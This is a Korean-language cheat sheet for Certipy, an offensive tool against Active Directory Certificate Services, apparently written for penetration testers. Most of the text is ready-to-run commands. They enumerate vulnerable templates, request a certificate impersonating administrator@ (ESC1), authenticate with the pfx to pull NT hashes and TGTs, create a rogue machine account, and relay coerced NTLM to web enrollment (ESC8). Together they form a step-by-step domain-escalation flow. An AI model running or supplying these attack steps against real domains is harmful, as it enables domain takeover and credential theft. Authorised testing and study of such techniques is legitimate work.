# Certipy

- Certipy — AD CS(Active Directory Certificate Services) 열거와 악용(ESC1~ESC17)을 한 도구로 처리하는 파이썬 도구. 템플릿·CA 구성 수집, 인증서 요청, 인증, NTLM 릴레이를 전부 지원한다.
- AD CS가 설치된 도메인에서 취약한 인증서 템플릿(ESC1~)을 찾을 때, 템플릿 오용으로 관리자 인증서를 발급받아 도메인을 탈취할 때, 인증 강제(PetitPotam·Coercer)로 모은 NTLM을 CA 웹 등록(ESC8)으로 릴레이할 때.
- 도메인 인증 계정 1개(일반 유저면 충분), DC와 CA의 주소, 설치는 칼리 `apt install certipy-ad` 또는 `pip install certipy-ad`(python 3.12+).

## 설치와 실행 파일 이름

```bash
sudo apt install certipy-ad      # 칼리: 실행 파일이 certipy-ad
pip install certipy-ad           # pip: 실행 파일이 certipy (같은 프로그램)
```

- 워크스루가 `certipy`로 나오면 칼리에서는 `certipy-ad`로 바꿔 읽는다. `python -m certipy`는 공식 패키지에 `__main__.py`가 없어 동작하지 않는다.

## 템플릿·CA 열거 (find)

```bash
certipy-ad find -u user@corp.local -p 'Password1' -dc-ip 10.10.10.1 -vulnerable -stdout
certipy-ad find -u user@corp.local -p 'Password1' -dc-ip 10.10.10.1
```

- `-u user@domain -p 암호 -dc-ip IP`: 인증 기본 3종 세트.
- `-vulnerable`: ESC1 등 악용 가능한 템플릿만 표시. `-stdout`: 파일 저장 없이 콘솔로 바로 출력.
- 옵션 생략 시 도메인 이름이 붙은 *_Certipy.find.json/.html 파일로 저장된다.

## 인증서 요청 → 인증 (ESC1 대표 흐름)

```bash
certipy-ad req -u user@corp.local -p 'Password1' -ca CORP-CA -template <템플릿명> -upn administrator@corp.local -dc-ip 10.10.10.1
certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.10.1
```

- `req -upn`: SAN 지정이 허용된 템플릿(ESC1)에서 관리자 UPN으로 인증서를 발급받는다.
- `req -target-ip`: CA(웹 등록) 주소가 DC와 다를 때 지정. `-out`: 저장할 pfx 파일명.
- `auth -pfx`: 발급받은 pfx로 NT 해시·TGT를 받아낸다.

## 계정 생성 (account)

```bash
certipy-ad account create -u user@corp.local -p 'Password1' -user evilpc -pass 'P@ssw0rd' -dc-ip 10.10.10.1
```

- MachineAccountQuota가 열려 있으면 컴퓨터 계정을 만들어 ESC1·ESC4·RBCD 후속에 쓴다.

## 릴레이 (ESC8)

```bash
certipy-ad relay -target 10.10.10.5 -template DomainController -out dc.pfx
```

- 릴레이 서버로 동작한다. 다른 터미널에서 PetitPotam·Coercer로 DC 인증을 트리거하면 CA 웹 등록으로 넘겨 인증서를 뽑아낸다.

## 실전 흐름 예시

```bash
certipy-ad find -u user@corp.local -p 'Password1' -dc-ip 10.10.10.1 -vulnerable -stdout
certipy-ad req -u user@corp.local -p 'Password1' -ca CORP-CA -template CorpUser -upn administrator@corp.local -dc-ip 10.10.10.1
certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.10.1
```

## 팁·트러블슈팅

- CA 이름(-ca)은 find 결과의 CA Name에서 그대로 복사해 쓴다.
- auth가 실패하면 pfx의 EKU(스마트카드 로그온 여부)와 대상 계정 상태를 확인하고 `-username user -domain corp.local`으로 SID를 지정해 재시도.
- ESC3(등록 에이전트)·ESC4(템플릿 권한)·ESC6(EDITF)·ESC8(웹 등록)은 find 결과의 설명 칸을 함께 읽고 판단한다.
- DC 인증서(DomainController 템플릿)를 뽑았으면 certipy auth로 해시를 얻는다. 실패하면 -debug로 UPN·SID 매핑을 확인.
